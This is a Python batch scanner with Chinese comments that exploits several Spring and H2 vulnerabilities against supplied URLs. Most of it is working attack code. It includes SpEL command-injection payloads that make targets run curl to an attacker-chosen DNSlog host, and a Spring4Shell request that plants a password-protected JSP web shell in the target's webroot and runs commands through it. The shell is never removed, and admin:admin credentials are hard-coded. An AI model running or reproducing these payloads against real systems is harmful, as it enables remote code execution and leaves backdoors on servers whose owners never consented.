import requests
import argparse
import json
import re


def arg():
    parser = argparse.ArgumentParser(
        description="这是spring的漏洞检测脚本",
        usage="demo.py -u [URL] | -f [FILE PATH]"
    )

    # 互斥参数且必选，必须二选一
    group = parser.add_mutually_exclusive_group(required=True)
    # 对这个解析对象添加几个命令行参数，type为输入类型,help为-h的帮助描述
    group.add_argument('-u', '--url', type=str, help='单目标URL')
    group.add_argument('-f', '--file', type=str, help='批量测试文件路径')
    parser.add_argument('-s', '--server', type=str, help='请输入dnslog地址')
    # 实例化 parser
    args = parser.parse_args()
    return args


def change_url(url):
    # 确保URL以http://或https://开头
    if not url.startswith(('http://', 'https://')):
        url = f"http://{url}"
    # 移除末尾的斜杠
    return url.rstrip('/')


def CVE_2016_4977(url):
    url = change_url(url)
    headers = {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko)'
        , 'Authorization': 'Basic YWRtaW46YWRtaW4='}
    end_url = "/oauth/authorize?response_type=${233*233}&client_id=acme&scope=openid&redirect_uri=http://test"
    full_url = url + end_url
    try:
        response = requests.get(url=full_url, headers=headers, timeout=10, verify=False)
        if "54289" in response.text:
            print(f"[+] {url} - Vulnerable to CVE_2016_4977")
            return True
        else:
            print(f"[-] {url} - Not vulnerable to CVE_2016_4977")
            return False
    except Exception as e:
        print(f"[!] {url} - Error testing CVE_2016_4977: {str(e)}")
        return False


def CVE_2017_8046(url):
    url = change_url(url)
    headers = {
        'User-Agent': 'Mozilla/5.0',
        'Content-Type': 'application/json-patch+json'
    }

    payload = [{
        "op": "replace",
        "path": "T(java.lang.Runtime).getRuntime().exec(new java.lang.String(new byte[]{119,104,111,97,109,105}))/lastname",
        "value": "vulnerability_test"
    }]

    try:
        response = requests.patch(
            f"{url}/customers/1",
            headers=headers,
            data=json.dumps(payload),
            timeout=10,
            verify=False
        )

        if "EL" in response.text or "SpEL" in response.text:
            print(f"[+] {url} - Vulnerable to CVE-2017-8046")
            return True
        else:
            print(f"[-] {url} - Not vulnerable to CVE-2017-8046")
            return False
    except Exception as e:
        print("[!] {url} - Error testing CVE-2017-8046")
        return False


def CVE_2022_22978(url):
    url = change_url(url)
    headers = {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko)'
        , 'Authorization': 'Basic YWRtaW46YWRtaW4='}
    end_url = "/admin/%0atest"
    full_url = url + end_url
    try:
        response = requests.get(url=full_url, headers=headers, timeout=10, verify=False)
        if "Congratulations, you are an admin!" in response.text:
            print(f"[+] {url} - Vulnerable to CVE-2022-22978")
            return True
        else:
            print(f"[-] {url} - Not vulnerable to CVE-2022-22978")
            return False
    except Exception as e:
        print(f"[!] {url} - Error testing CVE-2022-22978: {str(e)}")
        return False


def CVE_2022_22965(url):
    url = change_url(url)
    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko)',
        'Accept-Encoding': 'gzip, deflate',
        'Accept': '*/*',
        'Accept-Language': 'en',
        'Connection': 'close',
        'suffix': '%>//',
        'c1': 'Runtime',
        'c2': '<%',
        'DNT': '1'
    }
    end_url = "/?class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="
    full_url = url + end_url
    end_url2 = "/tomcatwar.jsp?pwd=j&cmd=id"
    full_url2 = url + end_url2
    try:
        requests.get(url=full_url, headers=headers)
        response = requests.get(url=full_url2,headers=headers)
        if "uid=0(root) gid=0(root) groups=0(root)" in response.text:
            print(f"[+] {url} - Vulnerable to CVE_2022_22965")
            return True
        else:
            print(f"[-] {url} - Not vulnerable to CVE_2022_22965")
            return False
    except:
        print("[!] {url} - Error testing CVE_2022_22965")
        return False


def CVE_2022_22963(url):
    url = change_url(url)
    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko)',
        'Accept-Encoding': 'gzip, deflate',
        'Accept': '*/*',
        'Accept-Language': 'en',
        'Connection': 'close',
        'spring.cloud.function.routing-expression': f'T(java.lang.Runtime).getRuntime().exec("curl {args.server}/CVE_2022_22963")',
        'Content-Type': 'text/plain'
    }
    end_url = "/functionRouter"
    payload = "test"
    full_url = url + end_url
    try:
        requests.post(url=full_url, headers=headers, data=payload)
        print(f"[!] CVE-2022-22963：已向您的云服务器：{args.server}发起请求，请关注日志结果")
    except:
        print("[!] {url} - Error testing CVE_2022_22963")
        return False


def CVE_2018_1273(url):
    url = change_url(url)
    headers = {
        'Connection': 'keep-alive',
        'Content-Length': '124',
        'Pragma': 'no-cache',
        'Cache-Control': 'no-cache',
        'Origin': 'http://192.168.224.200:8080',
        'Upgrade-Insecure-Requests': '1',
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
        'Referer': 'http://192.168.224.200:8080/users?page=0&size=5',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8'
    }
    end_url = "/users?page=&size=5"
    payload = f'username[#this.getClass().forName("java.lang.Runtime").getRuntime().exec("curl {args.server}/CVE-2018-1273")]=&password=&repeatedPassword='
    full_url = url + end_url
    try:
        requests.post(url=full_url, headers=headers, data=payload)
        print(f"[!] CVE-2018-1273：已向您的云服务器：{args.server}发起请求，请关注日志结果")
    except:
        print("[!] {url} - Error testing CVE_2022_22963")
        return False


def H2_Database(url):
    url = change_url(url)
    headers = {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko)'
        , 'Accept': 'text/html'}
    end_url = "/h2-console"
    full_url = url + end_url
    try:
        session = requests.Session()
        response = session.get(full_url, headers=headers, allow_redirects=False, timeout=10, verify=False)

        # 检查是否有重定向
        if 'Location' in response.headers:
            redirect_url = response.headers['Location']
            response = session.get(redirect_url, headers=headers, timeout=10, verify=False)

            # 尝试查找登录页面
            match = re.search(r"location\.href = '(login\.jsp\?jsessionid=[a-f0-9]+)'", response.text)
            if match:
                login_url = match.group(1)
                final_url = full_url + '/' + login_url
                final_response = requests.get(url=final_url, headers=headers, timeout=10, verify=False)

                if "Saved Settings" in final_response.text:
                    print(f"[+] {url} - Vulnerable to H2 Database UNACC")
                    return True
                else:
                    print(f"[-] {url} - Not vulnerable to H2 Database UNACC")
                    return False
            else:
                print(f"[-] {url} - Not vulnerable to H2 Database UNACC (No login page found)")
                return False
        else:
            # 直接检查响应内容
            if "H2 Console" in response.text or "Saved Settings" in response.text:
                print(f"[+] {url} - Vulnerable to H2 Database UNACC")
                return True
            else:
                print(f"[-] {url} - Not vulnerable to H2 Database UNACC")
                return False
    except Exception as e:
        print("[!] {url} - Error testing H2 Database")
        return False


def process_file(file_path):
    results = []
    try:
        with open(file_path, 'r') as f:
            for url in f:
                result = {
                    'url': url,
                    'vuln': []
                }

                print(f"\n[*] 测试目标: {url}")

                if CVE_2016_4977(url):
                    result['vuln'].append('CVE-2016-4977')

                if CVE_2017_8046(url):
                    result['vuln'].append('CVE-2017-8046')

                if CVE_2022_22978(url):
                    result['vuln'].append('CVE-2022-22978')

                if CVE_2022_22963(url):
                    result['vuln'].append('CVE-2022-22963')

                if CVE_2022_22965(url):
                    result['vuln'].append('CVE-2022-22965')

                if CVE_2018_1273(url):
                    result['vuln'].append('CVE-2018-1273')

                if H2_Database(url):
                    result['vuln'].append('H2-Database')

                results.append(result)
                print(f"[*] {url} 扫描完成\n")

        return results
    except Exception as e:
        print(f"[!] 处理文件时出错: {str(e)}")
        return results


if __name__ == "__main__":
    args = arg()
    print("*[开始扫描漏洞]*")

    if args.url:
        url = args.url
        print(f"[*] 单目标扫描: {url}")
        CVE_2016_4977(url)
        CVE_2017_8046(url)
        CVE_2022_22978(url)
        CVE_2022_22963(url)
        CVE_2022_22965(url)
        CVE_2018_1273(url)
        H2_Database(url)


    elif args.file:
        print(f"[*] 批量扫描文件: {args.file}")

        results = process_file(args.file)

        for result in results:
            url = result['url']
            vulns = result['vuln']
            if vulns:
                print(f"[+] {url} 存在漏洞: {vulns}")
            else:
                print(f"[-] {url} 无漏洞")
        print("*[扫描结束]*")
